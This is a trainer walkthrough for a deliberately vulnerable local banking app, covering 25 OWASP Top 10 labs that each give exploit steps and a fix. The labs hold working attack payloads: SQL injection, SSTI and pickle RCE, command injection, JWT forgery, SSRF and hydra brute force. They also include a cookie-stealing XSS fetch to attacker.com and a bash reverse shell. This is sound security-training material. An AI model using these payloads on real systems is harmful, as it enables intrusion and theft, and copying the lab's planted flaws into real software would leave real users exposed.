# SecureBank Labs — Trainer Walkthrough

> OWASP Top 10 (2025) · 25 Labs · Developer Security Training  
> Internet Banking Application

---

## Quick Start

```bash
git clone <repo>
cd training-box
docker compose up --build
```

Open **http://localhost** — the React banking app loads automatically.  
Seed data is bootstrapped on first container start:

| Username | Password | Role | Account |
|----------|----------|------|---------|
| alice | password123 | customer | #ACC-1001 · £4,200 |
| bob | qwerty | customer | #ACC-1002 · £12,800 |
| admin | admin | admin | — |

**Lab panel:** Click any item in the left sidebar under "OWASP LABS" to open a lab page with tabs: Exploit Steps / Affected Code / Hint / Fix.

---

## Service Map

| Service | URL | Purpose |
|---------|-----|---------|
| React Frontend | http://localhost | Banking UI + Lab Panel |
| Flask API | http://localhost/api/flask/ | A01, A04, A05, A07, A08, A10 |
| Django API | http://localhost/api/django/ | A02, A06 |
| Django Admin | http://localhost/admin/ | A02 Lab 5 |
| Go Report Svc | http://localhost/api/report/ | A05 Lab 12 |

---

## A01 — Broken Access Control

---

### Lab 1 — IDOR: View Another Customer's Account `Low`

**Objective:** Access account #ACC-1002 (bob's) while authenticated as alice.

**Exploit steps:**
1. Log in as `alice / password123` → note alice's account ID in the dashboard
2. Navigate to **My Accounts → Account Detail** — URL is `/banking/accounts/1`
3. Change the URL to `/banking/accounts/2` — bob's full account appears with balance and transactions
4. Confirm via API:
```bash
# Get alice's token
TOKEN=$(curl -s -X POST http://localhost/api/flask/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Access bob's account as alice
curl -H "Authorization: Bearer $TOKEN" http://localhost/api/flask/accounts/2
```

**Impact:** Any authenticated customer can read every other customer's balance and full transaction history. In a real bank this is a critical data breach.

**Affected code:** `flask-app/app/blueprints/accounts.py` — `GET /accounts/<id>` returns account with no ownership check.

**Fix:** Add `if account.user_id != current_user_id: abort(403)` before returning the account.

---

### Lab 2 — Privilege Escalation: Customer → Admin `Medium`

**Objective:** Call the admin user-management endpoint as a regular customer.

**Exploit steps:**
1. Log in as alice, capture the JWT token (previous lab step)
2. Call the admin endpoint directly — the frontend never links to it, but it's unprotected:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost/api/flask/admin/users
```
3. Observe the full user list including hashed passwords and email addresses
4. Also try: `curl -H "Authorization: Bearer $TOKEN" http://localhost/api/flask/admin/accounts`

**Impact:** Customer can enumerate all users, discover admin accounts, and prepare further attacks.

**Affected code:** `flask-app/app/blueprints/accounts.py` — `/admin/users` only checks that a valid JWT exists, not that `role == "admin"`.

**Fix:** Add a `@require_role("admin")` decorator that checks `payload["role"] == "admin"` and returns 403 otherwise.

---

### Lab 3 — SSRF: Internal Metadata Fetch `High`

**Objective:** Make the server fetch an internal URL you control.

**Exploit steps:**
1. The statement email feature POSTs to `/api/flask/accounts/statement-email`
2. Supply an attacker-controlled callback URL:
```bash
curl -X POST http://localhost/api/flask/accounts/statement-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"account_id": 1, "callback_url": "http://169.254.169.254/latest/meta-data/"}'
```
3. On cloud infrastructure this returns AWS/GCP instance metadata including IAM credentials
4. On local: try `http://django-app:8000/admin/` to demonstrate internal service access:
```bash
curl -X POST http://localhost/api/flask/accounts/statement-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"account_id": 1, "callback_url": "http://django-app:8000/"}'
```

**Impact:** Attacker can pivot to internal services unreachable from the internet — metadata APIs, internal admin panels, internal databases.

**Affected code:** `flask-app/app/blueprints/accounts.py` — `requests.get(callback_url)` with no URL validation.

**Fix:** Validate callback URL against an allowlist of approved domains. Block RFC-1918 private address ranges and loopback addresses.

---

## A02 — Security Misconfiguration

---

### Lab 4 — Debug Mode: Stack Trace Exposes DB Credentials `Low`

**Objective:** Trigger an unhandled exception to view Django's debug page.

**Exploit steps:**
1. Navigate to: `http://localhost/api/django/api/accounts/debug/`
2. Django's yellow debug page appears in the browser with:
   - Full Python stack trace
   - `settings.py` values including `SECRET_KEY`, `DATABASE_URL`
   - Installed middleware list
   - Local variable values at every frame
3. Demonstrate how `SECRET_KEY` can be used to forge Django session cookies

**Impact:** Any error exposes the full application internals. In Django, knowing `SECRET_KEY` allows forging session cookies and CSRF tokens.

**Affected code:** `django-app/banking/settings/dev.py` — `DEBUG = True`

**Fix:** Set `DEBUG = False` in production. Configure proper error pages and logging. Never put `DEBUG = True` on a public-facing server.

---

### Lab 5 — Default Admin Credentials `Low`

**Objective:** Log into Django's admin panel with default credentials.

**Exploit steps:**
1. Navigate to: `http://localhost/admin/`
2. Enter `admin / admin`
3. Observe full ORM-backed access: browse all users, accounts, transfers
4. Create a new admin user via the UI — demonstrates persistence

**Impact:** Attacker gains full database read/write access through the admin UI without touching the API.

**Fix:** Use strong, unique admin credentials. Restrict `/admin/` to internal network. Disable admin in production or add IP allowlist middleware.

---

### Lab 6 — Sensitive File Exposure: .env, .git, backup.zip `Medium`

**Exploit steps:**
1. Navigate to `http://localhost/.env` — full environment file with fake AWS/Stripe credentials
2. Navigate to `http://localhost/.git/config` — git remote URL revealing internal code repository
3. Navigate to `http://localhost/backup.zip` — downloads a SQLite database backup containing all users and transactions
4. Open the SQLite backup:
```bash
sqlite3 backup.db ".dump users"
```
5. Find MD5 password hashes — crack them in the next lab

**Impact:** AWS keys enable cloud account takeover. Database backup bypasses all API security. Git config reveals internal infrastructure.

**Fix:** Isolate static files to a dedicated directory. Never serve `.env` or `.git` from a web root. Use `.gitignore` and `STATIC_ROOT` pointing to a path with no sensitive files.

---

## A04 — Cryptographic Failures

---

### Lab 7 — MD5 Password Hashing: Crack with Hashcat `Medium`

**Objective:** Crack a user's password from their MD5 hash.

**Exploit steps:**
1. Obtain hashes via the exposed backup.zip (Lab 6) or via SQLi (Lab 10), or via the admin API:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost/api/flask/crypto/hashes
```
2. Save alice's hash to a file: `echo "0f359740bd1cda994f8b55330c86d845" > hashes.txt`
3. Crack with hashcat:
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
4. Result: `password123` in seconds (MD5 + no salt = trivially crackable)
5. Without hashcat, try CrackStation.net directly with the hash

**Impact:** All user passwords are compromised within minutes of obtaining any hash. Unsalted MD5 is not password storage — it's plaintext with extra steps.

**Fix:** Use `bcrypt` or `argon2`: `bcrypt.hashpw(password.encode(), bcrypt.gensalt())`. Never use MD5, SHA-1, or SHA-256 alone for passwords.

---

### Lab 8 — Hardcoded Weak JWT Secret: Forge Admin Token `Medium`

**Objective:** Forge a JWT with admin role using the hardcoded secret `"secret"`.

**Exploit steps:**
1. Log in as alice and copy the JWT token
2. Decode it at jwt.io — observe `{"role": "customer", "user_id": 1}`
3. The secret `"secret"` is visible in the Flask startup logs:
```bash
docker logs training-box-flask-app-1 | grep SECRET_KEY
```
4. Forge an admin token:
```python
import jwt
token = jwt.encode({"user_id": 3, "role": "admin", "username": "admin"}, "secret", algorithm="HS256")
print(token)
```
5. Use the forged token:
```bash
curl -H "Authorization: Bearer <forged_token>" http://localhost/api/flask/admin/users
```

**Impact:** Any user who can read logs, source code, or the .env file can become admin — authentication is completely bypassed.

**Fix:** Generate a cryptographically strong secret: `python3 -c "import secrets; print(secrets.token_hex(32))"`. Load it only from environment variables, never hardcode it.

---

### Lab 9 — PII in Cleartext API Responses and Logs `Low`

**Exploit steps:**
1. Authenticate and call the profile endpoint:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost/api/flask/crypto/profile
```
2. Response includes: full account number, sort code, email, balance, full name — in plaintext
3. Check Docker logs to see the same PII logged to stdout:
```bash
docker logs training-box-flask-app-1 | grep "profile"
```
4. If traffic is intercepted over HTTP (no HTTPS in dev), all this data is visible

**Impact:** PII in logs persists for years. PII in API responses over HTTP is visible to any network observer. Violates GDPR/PCI-DSS.

**Fix:** Mask sensitive fields in responses (`ACC-****1001`). Never log PII. Use TLS in transit. Apply field-level encryption at rest.

---

## A05 — Injection

---

### Lab 10 — SQL Injection: Login Bypass & Data Dump `High`

**Objective:** Bypass authentication and dump the database.

**Exploit steps (login bypass):**
1. At the login form, enter:
   - Username: `admin' --`
   - Password: `anything`
2. The raw SQL becomes: `SELECT * FROM users WHERE username='admin' --' AND password='...'`
3. The comment skips the password check — login succeeds as admin

**Exploit steps (data dump with sqlmap):**
```bash
# Save a login request to login.txt first, then:
sqlmap -u "http://localhost/api/flask/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --dbms=sqlite --dump --batch
```

**Exploit steps (search endpoint):**
```bash
curl "http://localhost/api/flask/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--"
```

**Impact:** Full database compromise. Authentication bypass gives admin access to all accounts and transactions.

**Fix:** Use parameterized queries: `db.session.execute(text("SELECT * FROM users WHERE username=:u AND password=:p"), {"u": username, "p": password_hash})`. Never interpolate user input into SQL strings.

---

### Lab 11 — SSTI: Jinja2 RCE via Transaction Remark `High`

**Objective:** Achieve remote code execution through the transaction remark field.

**Exploit steps:**
1. After making a transfer, add a remark via API:
```bash
curl -X POST http://localhost/api/flask/transfers/1/remark \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"remark": "{{7*7}}"}'
```
2. Response contains `<p>Remark: 49</p>` — template execution confirmed
3. Enumerate Python classes:
```bash
curl -X POST http://localhost/api/flask/transfers/1/remark \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"remark": "{{'\'''\''.__class__.__mro__[1].__subclasses__()}}"}'
```
4. Find subprocess index (look for `subprocess.Popen`), then RCE:
```bash
# Payload: {{''.__class__.__mro__[1].__subclasses__()[<N>](['id'],shell=True,stdout=-1).communicate()}}
# Replace <N> with the index of subprocess.Popen from step 3
```

**Impact:** Full server-side remote code execution — read files, exfiltrate data, establish reverse shell.

**Affected code:** `render_template_string(f"<p>{remark}</p>")` — user input interpolated before template parsing.

**Fix:** `render_template_string("<p>{{ remark }}</p>", remark=remark)` — pass data as a template variable, never interpolate into the template string itself.

---

### Lab 12 — SSTI + OS Command Injection: Go Echo Report Service `High`

**Objective:** Extract internal config via SSTI, then get RCE via command injection.

**SSTI exploit:**
```bash
# Extract the internal secret key
curl -X POST http://localhost/api/report/report/generate \
  -H "Content-Type: application/json" \
  -d '{"account_id": "1001", "template": "Secret: {{.Config.SecretKey}} DB: {{.Config.DBPath}}"}'

# Full config dump
curl -X POST http://localhost/api/report/report/generate \
  -H "Content-Type: application/json" \
  -d '{"account_id": "1001", "template": "{{printf \"%v\" .Config}}"}'
```

**OS Command Injection exploit:**
```bash
# Confirm injection with date command
curl -X POST http://localhost/api/report/report/date-filter \
  -H "Content-Type: application/json" \
  -d '{"from_date": "2024-01-01", "to_date": "2024-12-31"}'

# Inject id command
curl -X POST http://localhost/api/report/report/date-filter \
  -H "Content-Type: application/json" \
  -d '{"from_date": "2024-01-01'\'' && id && echo '\''", "to_date": "2024-12-31"}'

# Read /etc/passwd
curl -X POST http://localhost/api/report/report/date-filter \
  -H "Content-Type: application/json" \
  -d '{"from_date": "2024-01-01'\'' && cat /etc/passwd && echo '\''", "to_date": "2024-12-31"}'
```

**Fix (SSTI):** Use `html/template` instead of `text/template`. Never accept user-supplied template strings — render from fixed templates with dynamic data only.

**Fix (OS Cmd):** Parse and validate date format with `time.Parse("2006-01-02", input)`. Pass values as separate arguments to `exec.Command`, not via `sh -c`.

---

### Lab 13 — Stored XSS: Transaction Notes `Medium`

**Objective:** Store an XSS payload that fires for every user viewing the transfers page.

**Exploit steps:**
1. Log in as alice
2. Submit a transfer with a malicious note:
```bash
curl -X POST http://localhost/api/flask/transfers/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}'
```
3. Navigate to **Transfers** in the banking app — alert fires immediately
4. Log in as bob and navigate to Transfers — the same alert fires for bob too
5. Demonstrate cookie theft with a more realistic payload:
```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**Impact:** Stored XSS executes in every victim's browser. Can steal session tokens, redirect to phishing pages, or perform actions on behalf of users.

**Affected code:** `TransfersPage.tsx` — `<div dangerouslySetInnerHTML={{ __html: txn.note }} />`

**Fix:** `import DOMPurify from 'dompurify'` then `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(txn.note) }} />`. Or better: render as plain text — `<div>{txn.note}</div>`.

---

## A06 — Insecure Design

---

### Lab 14 — Business Logic: Negative Transfer Amount `Medium`

**Objective:** Create money from nothing by sending a negative transfer.

**Exploit steps:**
1. Check alice's initial balance (£4,200)
2. Send a negative transfer from bob to alice:
```bash
curl -X POST http://localhost/api/django/api/transfers/ \
  -H "Content-Type: application/json" \
  -d '{"from_account_id": 2, "to_account_id": 1, "amount": -1000}'
```
3. Refresh alice's account — balance increased to £5,200
4. Bob's balance also increased (both sides of a negative transfer increase their balance)
5. Demonstrate: alice sends `-999999` from her own account to herself → unlimited balance

**Impact:** Financial integrity completely compromised. Arbitrary balance manipulation.

**Fix:** Add explicit validation: `if amount <= 0: raise ValidationError("Amount must be positive")`. This is an **insecure design** flaw because the check was simply never considered during design.

---

### Lab 15 — Mass Assignment: Self-Promote to Admin `Medium`

**Objective:** Promote a customer account to admin by exploiting an over-permissive serializer.

**Exploit steps:**
1. Log in as alice and get a token
2. PATCH the profile endpoint including the `role` field:
```bash
curl -X PATCH http://localhost/api/django/api/accounts/profile/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username": "alice", "email": "alice@bank.com", "role": "admin"}'
```
3. Fetch the profile back and confirm `"role": "admin"`
4. Now use admin endpoints — alice has full admin access

**Impact:** Any user can self-promote to admin. All privileged data and operations are accessible.

**Affected code:** `BankUserSerializer` has `role` as a writable field; `ProfileView.patch()` calls `serializer.save()` with the full request body.

**Fix:** Add `read_only_fields = ['role']` to the serializer, or use separate serializers for read vs. write. Role changes should be a privileged admin operation only.

---

### Lab 16 — Account Enumeration via Error Messages `Low`

**Objective:** Enumerate valid usernames using different error messages.

**Exploit steps:**
1. Try logging in with a non-existent user:
```bash
curl -X POST http://localhost/api/django/api/accounts/login/ \
  -H "Content-Type: application/json" \
  -d '{"username": "notauser", "password": "anything"}'
# Response: {"error": "User not found"}
```
2. Try with a real user:
```bash
curl -X POST http://localhost/api/django/api/accounts/login/ \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "wrongpassword"}'
# Response: {"error": "Incorrect password"}
```
3. Script username enumeration using this difference:
```python
import requests
wordlist = ["alice", "bob", "admin", "charlie", "dave"]
for user in wordlist:
    r = requests.post("http://localhost/api/django/api/accounts/login/",
                      json={"username": user, "password": "x"})
    if "Incorrect password" in r.text:
        print(f"[+] Valid user: {user}")
```

**Impact:** Attacker can build a list of valid usernames for targeted brute-force, phishing, or credential stuffing attacks.

**Fix:** Return `{"error": "Invalid credentials"}` for both cases. Timing should also be equalized to prevent timing-based enumeration.

---

## A07 — Authentication Failures

---

### Lab 17 — Brute-Force Login: No Rate Limiting `Low`

**Objective:** Brute-force alice's password with no lockout in place.

**Exploit steps:**
```bash
# Using hydra
hydra -l alice -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/api/flask/auth/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 64

# Or using a simple Python script:
python3 -c "
import requests
with open('/usr/share/wordlists/common-passwords.txt') as f:
    for line in f:
        pw = line.strip()
        r = requests.post('http://localhost/api/flask/auth/login',
                          json={'username':'alice','password':pw})
        if 'token' in r.text:
            print('Found:', pw); break
        print('Tried:', pw)
"
```

**Impact:** Given no lockout, an attacker will find a password eventually. Common passwords like `password123` are found in seconds.

**Fix:** Add `Flask-Limiter` with `@limiter.limit("5/minute")`. Implement account lockout after N failures. Add CAPTCHA for web-facing login forms.

---

### Lab 18 — Session Fixation `Medium`

**Objective:** Pre-set a session ID before login and hijack the session after authentication.

**Exploit steps:**
1. Set a known session cookie before logging in:
```bash
curl -c cookies.txt -b "session=attacker_controlled_session_id" \
  -X POST http://localhost/api/flask/auth/login-session \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```
2. The app does NOT regenerate the session ID on login — the session is now authenticated
3. Use the same cookie from another browser/client:
```bash
curl -b "session=attacker_controlled_session_id" http://localhost/api/flask/accounts/1
```
4. Attacker now has alice's authenticated session

**Impact:** Any attacker who can set a victim's cookie (via XSS, network interception, or link injection) can fully take over the authenticated session.

**Fix:** Call `session.clear()` and issue a new session ID immediately after successful authentication. Flask: use `flask.session.regenerate()` or clear and re-populate the session dict.

---

### Lab 19 — Insecure Password Reset: Predictable Token `High`

**Objective:** Compute a valid password reset token without access to the target's email.

**Exploit steps:**
1. Request a reset for alice and note the timestamp:
```bash
TIME=$(date +%s)
curl -X POST http://localhost/api/flask/auth/reset-request \
  -H "Content-Type: application/json" \
  -d '{"username": "alice"}'
# Response includes the token (for lab convenience)
```
2. Compute the token offline (attacker knows alice's username):
```python
import hashlib, time
username = "alice"
# Try timestamps within a 60-second window around when the request was made
for offset in range(-30, 31):
    ts = int(time.time()) + offset
    token = hashlib.md5(f"{username}{ts}".encode()).hexdigest()
    print(token)
```
3. Submit the computed token:
```bash
curl -X POST http://localhost/api/flask/auth/reset-confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "<computed_token>", "new_password": "hacked"}'
```

**Impact:** Attacker can reset any user's password knowing only their username and approximate time of reset request.

**Fix:** Use `secrets.token_urlsafe(32)` for cryptographically random tokens. Store with a 1-hour expiry. Delete after single use.

---

## A08 — Software & Data Integrity Failures

---

### Lab 20 — Insecure Deserialization: Pickle RCE `High`

**Objective:** Achieve remote code execution by uploading a malicious pickle file.

**Exploit steps:**
1. Create the malicious payload:
```python
# Create payload.pkl
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))

with open('payload.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```
2. Upload to the account import endpoint:
```bash
curl -X POST http://localhost/api/flask/integrity/import-account \
  -H "Authorization: Bearer $TOKEN" \
  -F "data=@payload.pkl"
```
3. The `os.system('id > /tmp/pwned.txt')` command executes on the server
4. Escalate to a reverse shell:
```python
cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
# Replace os.system call in the payload above
```

**Impact:** Arbitrary code execution on the server with the Flask process's privileges — full container compromise, lateral movement possible.

**Fix:** Never deserialize untrusted data with pickle. Use JSON for data exchange. If deserialization is unavoidable, use a schema validator (e.g., `jsonschema`) and sandboxed deserialization.

---

### Lab 21 — JWT Algorithm Confusion: alg:none Bypass `Medium`

**Objective:** Forge an admin JWT by stripping the signature and setting `alg: none`.

**Exploit steps:**
1. Get any valid JWT from login
2. Decode the header and payload (base64):
```python
import base64, json
token = "eyJ..."  # your token
header_b64, payload_b64, sig = token.split(".")
header = json.loads(base64.b64decode(header_b64 + "=="))
payload = json.loads(base64.b64decode(payload_b64 + "=="))
print(header, payload)
```
3. Forge an admin token with `alg: none`:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 3, "username": "admin", "role": "admin"}
forged = f"{b64url(header)}.{b64url(payload)}."  # empty signature
print(forged)
```
4. Use the forged token:
```bash
curl -H "Authorization: Bearer <forged_token>" http://localhost/api/flask/admin/users
```

**Impact:** Complete authentication bypass — any client can claim any identity including admin.

**Fix:** Always specify `algorithms=["HS256"]` explicitly in `jwt.decode()`. Never pass `options={"verify_signature": False}`. Reject tokens with `alg: none`.

---

### Lab 22 — Unverified File Upload: Web Shell `High`

**Objective:** Upload a Python web shell and execute commands via HTTP.

**Exploit steps:**
1. Create a web shell:
```python
# shell.py
import subprocess
from flask import request, Flask
app = Flask(__name__)
@app.route('/cmd')
def cmd():
    return subprocess.check_output(request.args.get('c'), shell=True).decode()
```
Actually, since the uploaded file is served statically, use a simpler approach — upload a `.html` file with JavaScript or a CGI script. For demonstration, upload to show the path:
```bash
# Upload a test file
echo "SHELL_HERE" > shell.txt
curl -X POST http://localhost/api/flask/integrity/kyc-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.txt"
# Response: {"url": "/uploads/shell.txt"}

# Access the uploaded file directly
curl http://localhost/uploads/shell.txt
```
2. Upload a `.py` file to demonstrate that any extension is accepted
3. In a real CGI environment this would execute — demonstrate the path traversal risk:
```bash
# Upload with path traversal in filename attempt
curl -X POST http://localhost/api/flask/integrity/kyc-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.txt;filename=../../shell.txt"
```

**Impact:** Arbitrary file placement on the server. In CGI/WSGI environments, Python files can execute. Any file type (`.html`, `.svg` with XSS, `.zip` bombs) accepted.

**Fix:** Validate MIME type server-side (not client-provided Content-Type). Generate a UUID-based filename. Store uploads outside the web root. Serve through a handler that sets `Content-Disposition: attachment`.

---

## A10 — Mishandling of Exceptional Conditions

---

### Lab 23 — Verbose Error: Stack Trace with Config Values `Low`

**Objective:** Trigger an unhandled exception to extract internal configuration.

**Exploit steps:**
```bash
# Pass a non-integer ID to trigger ValueError
curl "http://localhost/api/flask/transfers/account-summary?id=abc"
```
Response contains the full Python stack trace including:
- `DATABASE_URL` with the SQLite file path
- `SECRET_KEY` = `"secret"`
- Flask version and installed packages
- Internal function call chain

**Impact:** Stack traces are roadmaps for attackers — they reveal exact file paths, library versions with known CVEs, and configuration secrets.

**Fix:** Wrap `int(id)` in a `try/except ValueError`. Add a global Flask error handler:
```python
@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(str(e))
    return {"error": "An internal error occurred"}, 500
```

---

### Lab 24 — Error-Based Info Disclosure: Type Coercion `Medium`

**Objective:** Send a string as an amount to trigger a TypeError revealing ORM internals.

**Exploit steps:**
```bash
curl -X POST http://localhost/api/flask/transfers/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id": 1, "to_account_id": 2, "amount": "notanumber"}'
```
Response reveals:
- Internal variable names (`amount`, `balance`)
- ORM query string with table/column names
- Python type information

**Impact:** Leaks the application's internal data model. Attackers use column names for precise SQL injection and ORM exploitation.

**Fix:** Validate `amount` as a positive number at the input boundary before any processing. Return `{"error": "Invalid amount"}` for bad input.

---

### Lab 25 — Insecure Fallback: Auth Bypass on Exception `High`

**Objective:** Send a malformed JWT to trigger the `except: pass` fallback and get admin access.

**Exploit steps:**
```bash
# Send a deliberately malformed token (not even valid base64)
curl -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
  http://localhost/api/flask/transfers/history
```
The decode raises `jwt.DecodeError`, the bare `except: pass` swallows it, `user_id` defaults to `1` (admin), and the response returns all transfers as admin.

```bash
# Confirm: send garbage token vs. no token
curl http://localhost/api/flask/transfers/history  # 401
curl -H "Authorization: Bearer garbage" http://localhost/api/flask/transfers/history  # 200 as admin!
```

**Impact:** Any user (even unauthenticated) can access admin-level data by sending a deliberately invalid token. The fallback "safe" default is actually the most dangerous possible value.

**Fix:**
```python
# Replace:
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    user_id = payload["user_id"]
except:
    user_id = 1  # WRONG

# With:
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    user_id = payload["user_id"]
except jwt.InvalidTokenError:
    return jsonify({"error": "Invalid token"}), 401
```
Never fail open. Exceptions in authentication logic must always fail closed (deny access).

---

## Training Session Guide

### Suggested timing (full day)

| Time | Content |
|------|---------|
| 09:00 | Setup, docker compose up, seed verification |
| 09:15 | Intro: OWASP Top 10 2025 overview, what SecureBank Labs demonstrates |
| 09:30 | **A01** — Access Control (Labs 1–3) |
| 10:30 | **A02** — Misconfiguration (Labs 4–6) |
| 11:00 | **A04** — Cryptographic Failures (Labs 7–9) |
| 11:30 | Break |
| 11:45 | **A05** — Injection (Labs 10–13): SQLi, SSTI×2, XSS |
| 13:00 | Lunch |
| 14:00 | **A06** — Insecure Design (Labs 14–16) |
| 14:30 | **A07** — Auth Failures (Labs 17–19) |
| 15:15 | **A08** — Integrity Failures (Labs 20–22) |
| 16:00 | **A10** — Exception Handling (Labs 23–25) |
| 16:45 | Q&A, recap, remediation principles |
| 17:00 | End |

### Half-day option (priority labs)
A01-Lab1 (IDOR) → A05-Lab10 (SQLi) → A05-Lab11 (SSTI) → A05-Lab13 (XSS) → A07-Lab19 (Reset Token) → A08-Lab20 (Pickle) → A10-Lab25 (Auth fallback)

### Key takeaways per category

| Category | Core message |
|----------|-------------|
| A01 | Authorization must be enforced server-side on every request |
| A02 | Defaults are insecure; every setting is a security decision |
| A04 | Cryptography is not optional; use purpose-built libraries |
| A05 | Never trust user input; parameterize everything |
| A06 | Security requirements must be designed in, not bolted on |
| A07 | Authentication is more than a password check |
| A08 | Only deserialize data you created and control |
| A10 | Exceptions must fail closed; never fail open |
